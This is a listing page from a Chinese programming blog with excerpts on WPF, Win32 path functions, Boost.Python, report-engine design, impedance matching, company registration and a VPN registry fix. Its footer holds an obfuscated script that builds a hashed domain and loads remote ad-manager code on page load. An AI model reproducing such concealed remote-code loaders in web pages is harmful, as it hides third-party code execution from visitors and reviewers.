			<a href="/posts/e1a3f85321206803bfd5344fe2d70f18/" rel="bookmark">
			谈谈WPF
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 其实WPF的大名很早以前就听说了，但是真正接触，还是Mike的要求。Mike加入我的开源项目后，强烈建议将项目代码转向WPF。我就同意了。 其实WPF在国外已经很流行了，但是在国内流行情况似乎才刚起步不久，国内总是慢国外半拍。 记得当初接触C#2。0的时候，被设计代码和逻辑代码的分离而感叹，要知道，在VS2003里，C#的代码是一个大文件，常常是上千行（IDE自动生成的居多）。 然而VS2005的设计代码分离，却不彻底。因为许多界面自动布局的功能，依然要用代码来实现。这就又造成了设计代码和逻辑代码混淆。 WPF出现以后，这个问题据说彻底的解决了。设计代码完全在表示层实现，逻辑代码完全在后台实现，有点类似与asp.net。 在我看来，linq的出现很好的解决了数据层使用的问题，让我这个没有系统学习过sql的人都能够操作数据库。 这样以来，三层结构已经很好的分离开来，而唯独留下了逻辑层——因为这才是我们专业人员需要工作的地方。 很早以前我就非常推崇三层分离，集中精力在逻辑层，展现我们专业人员才华。 现在回头看看别人有C++MFC写的程序，界面代码、逻辑功能代码、数据访问代码，混合在一起，真的有一种不堪入目的感觉。 要知道我有尽三年的C++编程经历，C++编程曾经炉火纯青。唉，现在让我写C++程序，我都头痛，杯具啊…… 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d97e957cbfe90450a3bf7986b24c7e49/" rel="bookmark">
			也谈GetCurrentDirectory 和 GetModuleFileName的 区别（在Command窗口下运行.exe程序）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于GetCurrentDirectory 和 GetModuleFileName的 区别，网络上已经有许多详细的阐述，这里不再赘述。下面仅谈一点，即我们用command窗口运行.exe文件时，这两者的区别。
1. GetCurrentDirectory：获取当前进程路径。
2. GetModuleFileName：获取当前执行程序路径。
我们经常会在command窗口下（在"运行"中输入"cmd"）运行一些可执行程序，在这种情况下，GetCurrentDirectory 和 GetModuleFileName的区别如下：
int main( ){char szPath[255];BOOL bRet = GetCurrentDirectory(sizeof(szPath), szPath);printf("GetCurrentDirectory: %s/n", szPath);bRet = GetModuleFileName(NULL, szPath, sizeof(szPath));printf("GetModuleFileName: %s/n", szPath);return 0;} 在command窗口中输入：(将main.exe放在D盘根目录下)
C:/D:/Main.exe
输出如下：
GetCurrentDirectory: C:/
GetModuleFileName: D:/Main.exe
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bf49d4c9ff70db8471708000768aa6f/" rel="bookmark">
			Jensen不等式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Jensen不等式，凸函数的期望大于等于期望的函数
Ef(X) /geq f(EX)
利用这个不等式，可以推导出相对熵总是非负的。而在等于0时，相对熵的两个函数相等。
这个公式推导，可以参考 elements of information theory chap 2 p27
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb2c0b860f3a4ef94ec53368036b39f9/" rel="bookmark">
			Boost.Python实现C&#43;&#43;与Python互调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Technorati 标签: C++ , Python , Boost 【编者按】最近一直发Python的资料，是因为Python的脚本扩展性。现在.net的动态语言特性已经很强大了，似乎脚本的作用并不明显。但是对于老式的C++，如果能够结合脚本语言的动态性，引用最近流行的一句话：必可以形成犄角之势！C++调用Python可以通过API，也可以通过Boost库实现，Boost.Python就是对API的包装，方便调用而已。 这是一篇比较老的介绍Boost.Python的文章，权当入门吧。因为文中一些东西现在不对…… Boost.Python 是 Boost 中的一个组件， 使用它能够大大简化用 C++ 为 Python 写扩展库的步骤， 提高开发效率， 虽然目前它对 Python 嵌入 C++ 的支持还不是很多， 但也能提供很大方便。 另外， 华宇煜 也编写了一份关于 Boost.Python 简明教程 。 1 Boost 安装简介 在正式开始使用 Boost.Python 之前， 我们必须先编译 Boost。 首先到 Boost 的官方站点 下载 Boost 的源码包， 把它们解压到你喜欢的目录， 为编译做好准备。 另外， 在正式安装 Boost.Python 之前， 我们必须先正确安装 Python。 1.1 Linux 下的编译 首先切换到 Boost 源码所在的路径， 执行 ./configure 脚本， 为配置脚本提供 Python 运行环境相应的参数： ./configure --with-python=/usr/bin/python / --with-python-version=2.4 / --with-python-root=/usr 然后， 和绝大部分 Linux 程序一行， 执行 make 就可以开始编译了。 编译完毕后， 切换到 root 权限后再执行 make install ， 把 Boost 相应的头文件和库文件复制到相应的地方， 就可以使用了。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb2c0b860f3a4ef94ec53368036b39f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f6ae7d0c3138133a6f556c43f184234/" rel="bookmark">
			我的第一篇文章
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这就是我的第一篇文章。呵呵
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15538747af2adfb2f1586fbe77a6c495/" rel="bookmark">
			报表引擎 －扩展模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 本文档是参考润乾报表模型，继《报表应用思路》的进一步分析，说明平台报表中涉及的多个相关模型，为后续报表开发提供概念以及总体设计支持 术语 名称
说明
单元格
报表由行列整齐的格子组成，这些格子我们称为单元格，所有的单元格组成了报表。
主格和附属格
主格和附属格是互相关联的，当A单元格扩展时，B单元格被 同步复制，此时A单元格称为B单元格的主格，B单元格称为A单元格的附属单元格。
横伸主格
如果A单元格横向扩展则则A为横伸主格
纵展主格
如果A单元格纵向扩展则则A为纵展主格
合并单元格
多个连续的单元格通过合并操作后显示为一个大的格子，合并后的格子成为合并单元格
单元格属性值和表达式
单元格的大部分属性都有属性值和表达式两种。
属性值是在编辑报表时确定的，在运行期间不必经过运算，而表达式在运行期间需要经过运算而获得属性值。
单元格的层次坐标
通过单元格的坐标表示法唯一标识扩展后的格子
扩展概念 可扩展单元格 当单元格的数据值表达式包含集合函数时，该单元格默认为可扩展单元格,可以修改扩展方向属性为默认、横向扩展或者纵向扩展。对于不包含集合函数的单元格，扩展方向属性默认为不可扩展。 横向扩展 描述： 当单元格为可扩展单元格时，可以把该单元格的扩展方向设为横向扩展，此时该单元格会横向进行复制，复制单元格的数据值依次为集合函数的结果数据值，集合返回几个值，单元格就复制几个，这种现象称为单元格的横向扩展 单元格进行扩展时，主单元格或同级别单元格被拉大成合并单元格，附属单元格被复制　（参考主格和附属格的认定规则） 复制出来的新单元格的所有属性都引用被复制单元格的属性 例1：横向扩展 从下图中可以看出，B2单元格是横向扩展格，我们把B2单元格边框用颜色标识一下，以便扩展后容易识别，如下图所示 扩展前： B1
C1
B2
C2
B3
C3
扩展后： B1 F1
B2
F2
B3
F3
说明：在这个例子中，B2为横向扩展格，因此B3缺省为B2的附属单元格，因此当B2扩展时，B3被复制；B1虽然在B2的上方，但由于B1不是扩展格,所以不是B2的 横伸主格，B1和B2的横伸主格都是00格，因此B1和B2属于同一级别的单元格， 因此B2扩展的时候，也会把同级别单元格B1拉大。 例2：下方较高级别或同级别单元格被横向拉大 扩展前：假设B2是B1的附属单元格，B4也是B1的附属单元格，因此从逻辑上讲，B4至少和B2平级，当B2进行扩展时，B4应该延展，不应该复制 B1
C1
B2
C2
B3
C3
B4
C4
扩展后： B1
F1
B2
F2
B3
F3
B4
F4
纵向扩展 描述： 当单元格为可扩展单元格时，可以把该单元格的扩展方向设为纵向扩展，此时该单元格会纵向进行复制，复制单元格的数据值依次为表达式的结果数据值，表达式返回几个值，单元格就复制几个，这种现象称为单元格的纵向扩展 单元格进行扩展时，主单元格或同级别单元格被拉大成合并单元格，附属单元格被复制　（参考　主格和附属格的认定规则） 复制出来的新单元格的所有属性都引用被复制单元格的属性 例1：纵向扩展 从下图中可以看出，B2单元格是纵向扩展格，我们把B2单元格边框用颜色标识一下，以便扩展后容易识别，如下图所示 扩展前： A1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15538747af2adfb2f1586fbe77a6c495/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b62c01918122b2cd3fa73ce4070937fc/" rel="bookmark">
			怎样理解阻抗匹配？（转）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		怎样理解阻抗匹配?
阻抗匹配是指信号源或者传输线跟负载之间的一种合适的搭配方式。阻抗匹配分为低频和高频两种情况讨论。
我们先从直流电压源驱动一个负载入手。由于实际的电压源，总是有内阻的(请参看输出阻抗一问)，我们可以把一个实际电压源，等效成一个理想的电压源跟一个电阻r串联的模型。假设负载电阻为R，电源电动势为U，内阻为r，那么我们可以计算出流过电阻R的电流为：I=U/(R+r)，可以看出，负载电阻R越小，则输出电流越大。负载R上的电压为：Uo=IR=U*[1+(r/R)]，可以看出，负载电阻R越大，则输出电压Uo越高。再来计算一下电阻R消耗的功率为：
P=I*I*R=[U/(R+r)]*[U/(R+r)]*R=U*U*R/(R*R+2*R*r+r*r)
=U*U*R/[(R-r)*(R-r)+4*R*r]
=U*U/{[(R-r)*(R-r)/R]+4*r}
对于一个给定的信号源，其内阻r是固定的，而负载电阻R则是由我们来选择的。注意式中[(R-r)*(R-r)/R]，当R=r时，[(R-r)*(R-r)/R]可取得最小值0，这时负载电阻R上可获得最大输出功率Pmax=U*U/(4*r)。即，当负载电阻跟信号源内阻相等时，负载可获得最大输出功率，这就是我们常说的阻抗匹配之一。对于纯电阻电路，此结论同样适用于低频电路及高频电路。当交流电路中含有容性或感性阻抗时，结论有所改变，就是需要信号源与负载阻抗的的实部相等，虚部互为相反数，这叫做共厄匹配。在低频电路中，我们一般不考虑传输线的匹配问题，只考虑信号源跟负载之间的情况，因为低频信号的波长相对于传输线来说很长，传输线可以看成是“短线”，反射可以不考虑(可以这么理解：因为线短，即使反射回来，跟原信号还是一样的)。从以上分析我们可以得出结论：如果我们需要输出电流大，则选择小的负载R;如果我们需要输出电压大，则选择大的负载R;如果我们需要输出功率最大，则选择跟信号源内阻匹配的电阻R。有时阻抗不匹配还有另外一层意思，例如一些仪器输出端是在特定的负载条件下设计的，如果负载条件改变了，则可能达不到原来的性能，这时我们也会叫做阻抗失配。
在高频电路中，我们还必须考虑反射的问题。当信号的频率很高时，则信号的波长就很短，当波长短得跟传输线长度可以比拟时，反射信号叠加在原信号上将会改变原信号的形状。如果传输线的特征阻抗跟负载阻抗不匹配(相等)时，在负载端就会产生反射。为什么阻抗不匹配时会产生反射以及特征阻抗的求解方法，牵涉到二阶偏微分方程的求解，在这里我们不细说了，有兴趣的可参看电磁场与微波方面书籍中的传输线理论。传输线的特征阻抗(也叫做特性阻抗)是由传输线的结构以及材料决定的，而与传输线的长度，以及信号的幅度、频率等均无关。例如，常用的闭路电视同轴电缆特性阻抗为75欧，而一些射频设备上则常用特征阻抗为50欧的同轴电缆。另外还有一种常见的传输线是特性阻抗为300欧的扁平平行线，这在农村使用的电视天线架上比较常见，用来做八木天线的馈线。因为电视机的射频输入端输入阻抗为75欧，所以300欧的馈线将与其不能匹配。实际中是如何解决这个问题的呢?不知道大家有没有留意到，电视机的附件中，有一个300欧到75欧的阻抗转换器(一个塑料包装的，一端有一个圆形的插头的那个东东，大概有两个大拇指那么大的)?它里面其实就是一个传输线变压器，将300欧的阻抗，变换成75欧的，这样就可以匹配起来了。这里需要强调一点的是，特性阻抗跟我们通常理解的电阻不是一个概念，它与传输线的长度无关，也不能通过使用欧姆表来测量。为了不产生反射，负载阻抗跟传输线的特征阻抗应该相等，这就是传输线的阻抗匹配。如果阻抗不匹配会有什么不良后果呢?如果不匹配，则会形成反射，能量传递不过去，降低效率;会在传输线上形成驻波(简单的理解，就是有些地方信号强，有些地方信号弱)，导致传输线的有效功率容量降低;功率发射不出去，甚至会损坏发射设备。如果是电路板上的高速信号线与负载阻抗不匹配时，会产生震荡，辐射干扰等。
当阻抗不匹配时，有哪些办法让它匹配呢?第一，可以考虑使用变压器来做阻抗转换，就像上面所说的电视机中的那个例子那样。第二，可以考虑使用串联/并联电容或电感的办法，这在调试射频电路时常使用。第三，可以考虑使用串联/并联电阻的办法。一些驱动器的阻抗比较低，可以串联一个合适的电阻来跟传输线匹配，例如高速信号线，有时会串联一个几十欧的电阻。而一些接收器的输入阻抗则比较高，可以使用并联电阻的方法，来跟传输线匹配，例如，485总线接收器，常在数据线终端并联120欧的匹配电阻。
为了帮助大家理解阻抗不匹配时的反射问题，我来举两个例子：假设你在练习拳击——打沙包。如果是一个重量合适的、硬度合适的沙包，你打上去会感觉很舒服。但是，如果哪一天我把沙包做了手脚，例如，里面换成了铁沙，你还是用以前的力打上去，你的手可能就会受不了了——这就是负载过重的情况，会产生很大的反弹力。相反，如果我把里面换成了很轻很轻的东西，你一出拳，则可能会扑空，手也可能会受不了——这就是负载过轻的情况。另一个例子，不知道大家有没有过这样的经历：就是看不清楼梯时上/下楼梯，当你以为还有楼梯时，就会出现“负载不匹配”这样的感觉了。当然，也许这样的例子不太恰当，但我们可以拿它来理解负载不匹配时的反射情况。
==========================================================================
作者：老杨(武汉)
由于普通的传输线阻抗Z0通常在 50Ω左右，而负载阻抗通常在几千欧姆到几十千欧姆。因此，在负载端实现阻抗匹配比较困难。然而，由于信号源端(输出)阻抗通常比较小，大致为十几欧姆。因此在源端实现阻抗匹配要容易的多。如果在负载端并接电阻，电阻会吸收部分信号对传输不利(我的理解).
当选择TTL/CMOS标准 24mA驱动电流时，其输出阻抗大致为13Ω。若传输线阻抗Z0=50Ω，那么应该加一个33Ω的源端匹配电阻。13Ω+33Ω=46Ω (近似于50Ω，弱的欠阻尼有助于信号的setup时间)
当选择其他传输标准和驱动电流时，匹配阻抗会有差异。在高速的逻辑和电路设计时，对一些关键的信号，如时钟、控制信号等，我们建议一定要加源端匹配电阻。
这样接了信号还会从负载端反射回来，因为源端阻抗匹配，反射回来的信号不会再反射回去。
转载于:https://www.cnblogs.com/zyjmlz/archive/2010/06/07/1753192.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc71e7026ad0b1660499802bb0d86694/" rel="bookmark">
			在北京注册科技类公司的经历（完）：总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一：首先确立公司的股东、股东股权比例以及出资额（如果注册资本分期交付的话，需要确定注册时各股东交付的资本额）、公司法人、公司名字（可以多想几个）；
第二：确定一个业务办理人专门负责办理公司注册业务。如果自己办的话，最好是股东之一。这个人最好在办完手续前别换。确定了这个人，他就可以去领名称预审表、填 表、交表，等结果了。同时，去刻一个法人名章，打听好工商局指定的可以办公司入资的银行，选定一个（最好人少的，在办事大厅附近有营业网点的），每个股东在这银行开一个活期账户（必须的）。在办理入资手续之前，每个股东把自己的出资存到账户里备着；
第三：名称预审通过后，领名称预审通知书、企业设立申请书，去办银行入资；
第四：入资后去会计师事务所办验资报告（费用需要几百到几千不等）；
第五：拿到验资报告后，去工商交企业设立申请书；
第六：领执照；
第七：刻章；
第八：办理组织机构代码证、税务登记证、统计证；
第九：税务报道；
第十：在银行设立基本户；
第十一：划资；
第十二：开始挣钱！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e024ebab02836820c319cf5bc3fd3bf/" rel="bookmark">
			×××连接报789错误解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 单击“开始”，单击“运行”，键入“regedit”，然后单击“确定”
2. 找到下面的注册表子项，然后单击它：
HKEY_LOCAL_MACHINE\
System\CurrentControlSet\Services\Rasman\Parameters
3. 在“编辑”菜单上，单击“新建”-&gt;“DWORD值”
4. 在“名称”框中，键入“ProhibitIpSec”
5. 在“数值数据”框中，键入“1”，然后单击“确定”
6. 退出注册表编辑器，然后重新启动计算机
转载于:https://blog.51cto.com/ljh9527/288141
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/303/">«</a>
	<span class="pagination__item pagination__item--current">304/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/305/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>